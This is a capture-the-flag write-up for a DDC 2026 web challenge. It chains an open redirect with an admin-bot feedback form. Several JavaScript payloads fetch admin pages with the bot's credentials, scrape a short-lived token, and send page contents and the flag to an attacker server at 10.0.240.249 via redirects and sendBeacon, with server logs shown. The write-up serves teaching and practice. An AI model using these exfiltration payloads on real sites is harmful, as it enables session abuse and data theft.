# Corsica - Web Exploitation

## About the competition

This challenge was part of the DDC (De Danske Cybermesterskaber) fast track 2026. 

## Initial recon

The target is a web application running on `https://corsica.cfire/`. The application has an admin panel at `https://corsica.cfire/admin` that is protected by authentication.

When logging in, a url like `https://corsica.cfire/cookie_check?next=/profile/USERID` is called, which checks if the user gives consent to use cookies. This is important for the attack, as we will see later.

```
GET /cookie_check?next=/profile/USERID HTTP/1.1
Host: corsica.cfire
Cookie: session=SESSION
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://corsica.cfire/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```


## exploitation

at `https://corsica.cfire/tips`, there is a form to submit feedback for the admin. The form submits a POST request to `https://corsica.cfire/request_admin` with the following body:

```
POST /request_admin HTTP/1.1
Host: corsica.cfire
Cookie: session=SESSION
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://corsica.cfire
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://corsica.cfire/tips
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

target_url=TARGET_URL&desc=DESCRIPTION
```

By testing we know that:
The `target_url` must begin with a `/`, and therefore the request we send cannot be another url like `http://attacker-url.com`
The admin bot will visit the endpoint we give it `eg. /profile/USERID, /admin, /tips`
The admin bot will not give us any output by itself. Which would also be very unrealistic if it did. 

### Open redirect

Remember the endpoint from earlier `https://corsica.cfire/cookie_check?next=/profile/USERID`? This endpoint can be used as an open redirect, which means we can make the admin bot visit any url we want by giving it a url like `https://corsica.cfire/cookie_check?next=http://attacker-url.com`.

I hosted a simple server on `http://10.0.240.249:8000` that logs the requests it receives. I then submitted the following payload to the feedback form:

```
target_url=/cookie_check?next=http://10.0.240.249:8000
```

When the admin bot visits the url, it will follow the redirect and make a request to `http://10.0.240.249:8000`, which is logged by my server. However, the request does not contain anything. It is just a simple GET request. 

I decided to host a js file on my server that makes a request to `https://corsica.cfire/admin` when executed. I figured that if the admin bot visits the url, it will execute the js file and make a request to the admin panel, which will contain the flag.

My first PoC looked like this:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://corsica.cfire/admin',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='http://10.0.240.249:8000/log?key='+encodeURIComponent(this.responseText);
};

req.onerror = function() {
	location='http://10.0.240.249:8000/log?err=onerror&status=' + req.status;
};

req.onabort = function() {
	location='http://10.0.240.249:8000/log?err=onabort';
};
```

I hosted an index.html that served this js file on my server and submitted the following payload to the feedback form:

```
target_url=/cookie_check?next=http://10.0.240.249:8000/index.html
```

reponse on my server:
```
10.0.240.1 - - [07/Mar/2026 22:01:27] "GET / HTTP/1.1" 200 -
10.0.240.1 - - [07/Mar/2026 22:01:27] "GET /poc.js HTTP/1.1" 200 -
10.0.240.1 - - [07/Mar/2026 22:01:27] code 404, message File not found
10.0.240.1 - - [07/Mar/2026 22:01:27] "GET /log?key=FULL_URL_ENCODED_HTML_PAGE HTTP/1.1" 404 -
```
The request to `/log?key=FULL_URL_ENCODED_HTML_PAGE` contains the full html page of the tips page, with /register and /login present, which indicates that the bot is not logged in.

This was very frustrating, as I expected the bot to be logged in and therefore have access to the admin panel. I tried a few things, but nothing worked.

After several hours of trial and error with different payloads, I tried looking at the page source of the tips page and noticed that there is a developer note:

```
<!-- Developer note: For safety, the "request admin" function will be interpreted as: https://localhost/<USER_SUPPLIED_PATH> -->
```

This is why the bot was not logged in. 
The bot is visiting localhost, not https://corsica.cfire, which means it does not set the cookie on corsica.cfire and therefore is not logged in.

Changing the payload to use the correct domain should resolve this issue.

```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://localhost/admin', true);
req.withCredentials = true;
req.onload = function() {
    navigator.sendBeacon('http://10.0.240.249:8000/log?key=' + encodeURIComponent(this.responseText));
};
req.send();
```

This gave the output html:

```html
<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <title>Corsica CTF Travel</title>
  <link rel="stylesheet" href="/static/style.css">
</head>

<body>
  <header>
    <h1>Corsica Tourist Travel</h1>
    <nav>
      <a href="/">Home</a>
      
      <a href="/guides">Guides</a>
      <a href="/tips">Travel Tips</a>
      <a href="/contact">Contact</a>
      <a href="/profile/49643fb37a5a452da984592be8515bc1">Profile</a>
      <a href="/logout">Logout</a>
      <!-- <a href="/admin">Admin</a> -->
      
      <a href="/admin">Admin</a>
      
      
    </nav>
  </header>

  <div class="container">
    
    
    
    
<h2>Admin Dashboard</h2>



<h3>Admin Resources</h3>
<ul>
  <li>Server status: <span style="color:green">OK</span></li>
  <li>FLASK secret key: <code>edit: No longer posted here for security reasons!</code></li>
  <li>Internal backup logs: available on request</li>
</ul>

<h3>Admin Flag Retrieval Tool</h3>
<p>A temporary session token has been generated for secure access to internal resources.</p>
<p><strong>Token:</strong> <code>668e745194a14f2ca3c8dbeda3d2ddda</code></p>
<p><em>Note: This token is valid for 5 seconds only.</em></p>

<form method="POST" action="/retrieve_flag">
  <input type="hidden" name="token" value="668e745194a14f2ca3c8dbeda3d2ddda">
  <input type="submit" value="Retrieve Flag">
</form>


  </div>

  <footer>
    <p style="color: rgba(255,255,255,1.0)">&copy; 2026 Pwnies Travel Guide</p>
  </footer>
</body>

</html>

```

we get a token, that is valid for 5 seconds. That token is used to obtain the flag, by sending it in a POST request to `/retrieve_flag`. 

There is two possible techniques that I can think of to get the flag

1. Be extremely fast and send the POST request with the token before it expires.
2. Automate it. 

I chose 2

```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://localhost/admin', true);
req.withCredentials = true;
req.onload = function() {
    var match = this.responseText.match(/name="token" value="([^"]+)"/);
    if (!match) {
        navigator.sendBeacon('http://10.0.240.249:8000/log?err=no_token');
        return;
    }
    var token = match[1];
    var req2 = new XMLHttpRequest();
    req2.open('post', 'https://localhost/retrieve_flag', true);
    req2.withCredentials = true;
    req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    req2.onload = function() {
        navigator.sendBeacon('http://10.0.240.249:8000/log?key=' + encodeURIComponent(this.responseText));
    };
    req2.send('token=' + encodeURIComponent(token));
};
req.send();
```

This will extract the token from the admin page, send a POST request to retrieve the flag, and then send the flag to my server.

Response on my server:
```
10.0.240.1 - - [07/Mar/2026 22:15:07] "GET / HTTP/1.1" 200 -
10.0.240.1 - - [07/Mar/2026 22:15:07] "GET /x.js HTTP/1.1" 200 -
10.0.240.1 - - [07/Mar/2026 22:15:07] code 501, message Unsupported method ('POST')
10.0.240.1 - - [07/Mar/2026 22:15:07] "POST /log?key=DDC%7Bc0rsic4_w3lcomes_y0u_w1th_0pen_arms%7D HTTP/1.1" 501 -
```

### The flag is `DDC{c0rsic4_w3lcomes_y0u_w1th_0pen_arms}`

